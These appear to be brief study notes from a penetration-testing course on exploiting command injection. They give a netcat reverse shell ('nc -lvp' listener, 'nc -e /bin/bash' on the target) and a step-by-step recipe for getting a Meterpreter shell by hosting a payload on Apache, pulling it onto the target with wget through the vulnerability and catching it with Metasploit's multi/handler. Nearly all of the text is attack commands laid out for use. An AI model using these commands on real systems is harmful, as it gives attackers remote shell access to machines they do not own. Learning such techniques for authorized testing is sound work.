Command Injection Exploitation

we shouldnt be able to execute other commands outside of a query

how to exploit using netcat
start listener on kali
nc -lvp [any_port]

go to target
run
nc -e /bin/bash [listener ip] [lport]



getting meterpreter shell with command injection
1) create payload appropriate with target
2) download payload to target through vuln
3) execute payload through vuln

to move payload to target machine...
1) upload payload to apache2 web server: sudo service apache2 start

2) download to target using wget command:
wget hostip/payload

now setup a listener inside msfconsole
use exploit/multi/handler
set options
set payload

run file on target
